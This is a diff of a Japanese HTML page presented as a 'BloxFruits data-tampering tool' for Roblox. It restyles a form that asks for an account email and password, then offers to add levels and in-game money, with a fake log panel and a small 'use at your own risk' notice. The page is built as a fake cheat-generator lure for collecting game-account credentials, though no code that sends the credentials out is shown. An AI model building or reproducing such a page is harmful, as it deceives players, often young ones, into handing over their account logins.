@@ -1,71 +1,322 @@
 <!DOCTYPE html>
 <html lang="ja">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>BloxFruits 情報改竄ツール</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body {
-      background: url('https://tr.rbxcdn.com/180DAY-7c0f003999e63b831af53f2ea454191b/768/432/Image/Webp/noFilter') center/cover no-repeat fixed;
-      font-family: 'Segoe UI', sans-serif;
-    }
-    .glass {
-      background: rgba(255, 255, 255, 0.08);
-      backdrop-filter: blur(20px);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-    }
-    .fade-in {
-      animation: fadeIn 1s ease-out forwards;
-      opacity: 0;
-    }
-    @keyframes fadeIn {
-      to {
-        opacity: 1;
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>BloxFruits 情報改竄ツール</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Jost:wght@400;600;800&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      body {
+        font-family: "Jost", sans-serif;
+        margin: 0;
+        padding: 0;
+        background: radial-gradient(circle at center, #1a1a1a, #0a0a0a);
+        overflow: hidden;
+        color: white;
       }
-    }
-    .flicker {
-      animation: flicker 1s infinite alternate;
-    }
-    @keyframes flicker {
-      0% { opacity: 1; }
-      100% { opacity: 0.7; }
-    }
-  </style>
-</head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4 text-white space-y-8">
 
-  <div class="text-center space-y-2 glass px-6 py-4 rounded-xl">
-    <canvas id="canvas" width="640" height="160" class="hidden rounded-xl"></canvas>
-  </div>
+      .particle {
+        position: fixed;
+        border-radius: 50%;
+        pointer-events: none;
+        opacity: 0.5;
+        animation: float 10s infinite linear;
+      }
 
-  <div class="glass rounded-3xl shadow-2xl p-8 w-full max-w-xl space-y-8 fade-in">
-    <div class="text-center space-y-2">
-      <h1 class="text-4xl font-extrabold text-blue-400 drop-shadow-md flicker">
-        BloxFruits 情報改竄ツール
-      </h1>
+      @keyframes float {
+        0% {
+          transform: translateY(100vh) scale(0.2);
+          opacity: 0;
+        }
+        100% {
+          transform: translateY(-10vh) scale(1);
+          opacity: 1;
+        }
+      }
+
+      .glass {
+        background: linear-gradient(
+          135deg,
+          rgba(20, 20, 20, 0.8),
+          rgba(0, 0, 0, 0.5)
+        );
+        border: 1px solid rgba(255, 255, 255, 0.15);
+        backdrop-filter: blur(15px);
+        box-shadow: 0 0 25px rgba(255, 255, 255, 0.08);
+      }
+
+      .gold-glow {
+        text-shadow: 0 0 8px #ffdf00aa, 0 0 16px #ffdf00cc;
+      }
+
+      canvas {
+        background: linear-gradient(
+          135deg,
+          rgba(255, 255, 255, 0.03),
+          rgba(255, 215, 0, 0.1)
+        );
+        border: 2px solid rgba(255, 215, 0, 0.6);
+        box-shadow: 0 0 25px rgba(255, 215, 0, 0.4),
+          inset 0 0 15px rgba(255, 215, 0, 0.2);
+        border-radius: 1rem;
+        display: block;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .canvas-line {
+        content: "";
+        position: absolute;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: linear-gradient(to right, transparent, gold, transparent);
+        animation: shine 2s linear infinite;
+      }
+
+      @keyframes shine {
+        0% {
+          transform: translateX(-100%);
+        }
+        100% {
+          transform: translateX(100%);
+        }
+      }
+
+      .radial-bg {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 150vmax;
+        height: 150vmax;
+        background: conic-gradient(
+          from 0deg,
+          #ff0000,
+          #ffff00,
+          #00ff00,
+          #00ffff,
+          #0000ff,
+          #ff00ff,
+          #ff0000
+        );
+        border-radius: 50%;
+        animation: spin 20s linear infinite;
+        filter: blur(150px) brightness(0.4);
+        z-index: 0;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: translate(-50%, -50%) rotate(0deg);
+        }
+        100% {
+          transform: translate(-50%, -50%) rotate(360deg);
+        }
+      }
+
+      .orb {
+        position: absolute;
+        width: 100px;
+        height: 100px;
+        border: 3px solid gold;
+        border-radius: 50%;
+        animation: rotateOrb 6s linear infinite;
+        box-shadow: 0 0 10px gold;
+        top: -30px;
+        left: 50%;
+        transform: translateX(-50%);
+      }
+
+      @keyframes rotateOrb {
+        0% {
+          transform: rotate(0deg) translateX(150px) rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg) translateX(150px) rotate(-360deg);
+        }
+      }
+
+      .loading-bar {
+        position: absolute;
+        bottom: 8px;
+        left: 10%;
+        width: 80%;
+        height: 4px;
+        background: linear-gradient(to right, transparent, gold, transparent);
+        background-size: 200% auto;
+        animation: shineBar 3s linear infinite;
+      }
+
+      @keyframes shineBar {
+        0% {
+          background-position: 200% center;
+        }
+        100% {
+          background-position: -200% center;
+        }
+      }
+
+      .shake {
+        animation: shakeIt 0.2s ease-in-out infinite;
+      }
+
+      @keyframes shakeIt {
+        0% {
+          transform: translate(0, 0);
+        }
+        25% {
+          transform: translate(3px, -2px);
+        }
+        50% {
+          transform: translate(-3px, 2px);
+        }
+        75% {
+          transform: translate(2px, 2px);
+        }
+        100% {
+          transform: translate(0, 0);
+        }
+      }
+    </style>
+  </head>
+
+  <body
+    class="flex flex-col items-center justify-center min-h-screen p-4 space-y-10"
+  >
+    <div class="radial-bg"></div>
+    <div id="particles"></div>
+
+    <div
+      class="glass rounded-3xl shadow-2xl p-8 w-full max-w-xl space-y-8 z-10"
+    >
+      <div class="text-center">
+        <h1 class="text-5xl font-extrabold text-yellow-300 gold-glow flicker">
+          BloxFruits 情報改竄ツール
+        </h1>
+        <img
+          src="https://images.sftcdn.net/images/t_app-icon-m/p/db46973c-9b36-11e6-96d8-00163ed833e7/1513365800/roblox-logo"
+          alt="Roblox Logo"
+          class="mx-auto w-24 mt-2 opacity-80"
+        />
+      </div>
+
+      <form id="account-form" class="space-y-4 transition-all duration-700">
+        <input
+          id="username"
+          placeholder="mailaddress"
+          class="w-full px-4 py-3 rounded-lg bg-gray-900 bg-opacity-60 focus:ring-2 focus:ring-yellow-400 border border-yellow-700 placeholder-gray-400"
+          required
+        />
+        <input
+          id="password"
+          type="password"
+          placeholder="password"
+          class="w-full px-4 py-3 rounded-lg bg-gray-900 bg-opacity-60 focus:ring-2 focus:ring-yellow-400 border border-yellow-700 placeholder-gray-400"
+          required
+        />
+        <button
+          type="submit"
+          class="w-full py-3 bg-gradient-to-r from-yellow-400 to-yellow-600 hover:from-yellow-500 hover:to-yellow-700 rounded-lg font-bold shadow-lg transition"
+        >
+          次へ
+        </button>
+      </form>
+
+      <div
+        id="canvas-container"
+        class="hidden relative text-center space-y-2 glass px-6 py-4 rounded-xl z-10"
+      >
+        <div class="canvas-line" style="top: 0"></div>
+        <canvas
+          id="canvas"
+          width="640"
+          height="160"
+          class="rounded-xl canvas-glow"
+        ></canvas>
+        <div class="canvas-line" style="bottom: 0"></div>
+        <div class="loading-bar"></div>
+        <div class="orb"></div>
+      </div>
+
+      <form
+        id="boost-form"
+        class="space-y-4 hidden transition-all duration-700"
+      >
+        <div class="grid grid-cols-2 gap-4">
+          <input
+            id="level-amount"
+            type="number"
+            min="1"
+            placeholder="増やしたいレベル数"
+            class="px-4 py-3 rounded-lg bg-gray-900 bg-opacity-60 focus:ring-2 focus:ring-green-400 border border-green-700 placeholder-gray-400"
+            required
+          />
+          <input
+            id="money-amount"
+            type="number"
+            min="1"
+            placeholder="増やしたい金額"
+            class="px-4 py-3 rounded-lg bg-gray-900 bg-opacity-60 focus:ring-2 focus:ring-blue-400 border border-blue-700 placeholder-gray-400"
+            required
+          />
+        </div>
+        <button
+          type="submit"
+          class="w-full py-3 bg-gradient-to-r from-green-400 to-blue-500 hover:from-blue-500 hover:to-green-500 rounded-lg font-bold shadow-lg transition"
+        >
+          送信
+        </button>
+      </form>
+
+      <div
+        id="log"
+        class="hidden bg-black bg-opacity-60 text-green-400 font-mono text-sm rounded-lg p-4 h-48 overflow-y-auto whitespace-pre-line border border-green-700 shadow-inner"
+      ></div>
     </div>
 
-    <form id="account-form" class="space-y-4 transition-all duration-700">
-      <input id="username" placeholder="mailaddress" class="w-full px-4 py-3 rounded-lg bg-gray-900 bg-opacity-70 focus:ring-2 focus:ring-blue-400 border border-blue-800 placeholder-gray-400" required />
-      <input id="password" type="password" placeholder="password" class="w-full px-4 py-3 rounded-lg bg-gray-900 bg-opacity-70 focus:ring-2 focus:ring-blue-400 border border-blue-800 placeholder-gray-400" required />
-      <button type="submit" class="w-full py-3 bg-gradient-to-r from-blue-500 to-indigo-600 hover:from-indigo-500 hover:to-blue-600 rounded-lg font-bold shadow-lg transition">次へ</button>
-    </form>
+    <script>
+      const colors = [
+        "#ff0000",
+        "#ffa500",
+        "#ffff00",
+        "#00ff00",
+        "#00ffff",
+        "#0000ff",
+        "#ff00ff",
+      ];
+      const particleCount = 80;
+      for (let i = 0; i < particleCount; i++) {
+        const particle = document.createElement("div");
+        particle.className = "particle";
+        const size = Math.random() * 6 + 3;
+        particle.style.width = `${size}px`;
+        particle.style.height = `${size}px`;
+        particle.style.left = `${Math.random() * 100}vw`;
+        particle.style.background =
+          colors[Math.floor(Math.random() * colors.length)];
+        particle.style.animationDuration = `${6 + Math.random() * 8}s`;
+        particle.style.animationDelay = `${Math.random() * 10}s`;
+        document.getElementById("particles").appendChild(particle);
+      }
+    </script>
 
-    <form id="boost-form" class="space-y-4 hidden transition-all duration-700">
-      <div class="grid grid-cols-2 gap-4">
-        <input id="level-amount" type="number" min="1" placeholder="増やしたいレベル数" class="px-4 py-3 rounded-lg bg-gray-900 bg-opacity-70 focus:ring-2 focus:ring-green-400 border border-green-700 placeholder-gray-400" required />
-        <input id="money-amount" type="number" min="1" placeholder="増やしたい金額" class="px-4 py-3 rounded-lg bg-gray-900 bg-opacity-70 focus:ring-2 focus:ring-yellow-400 border border-yellow-700 placeholder-gray-400" required />
-      </div>
-      <button type="submit" class="w-full py-3 bg-gradient-to-r from-green-500 to-yellow-500 hover:from-yellow-500 hover:to-green-500 rounded-lg font-bold shadow-lg transition">送信</button>
-    </form>
-
-    <div id="log" class="hidden bg-black bg-opacity-70 text-green-400 font-mono text-sm rounded-lg p-4 h-48 overflow-y-auto whitespace-pre-line border border-green-700 shadow-inner"></div>
-  </div>
-
-  <script src="script.js"></script>
-  <div style="position: fixed; bottom: 8px; right: 12px; font-size: 10px; color: red; opacity: 0.7; z-index: 50;">
-    ※ツールの使用は自己責任です。
-  </div>
-</body>
+    <div
+      style="
+        position: fixed;
+        bottom: 8px;
+        right: 12px;
+        font-size: 10px;
+        color: red;
+        opacity: 0.5;
+        z-index: 50;
+      "
+    >
+      ※ツールの使用は自己責任です。
+    </div>
+  </body>
 </html>
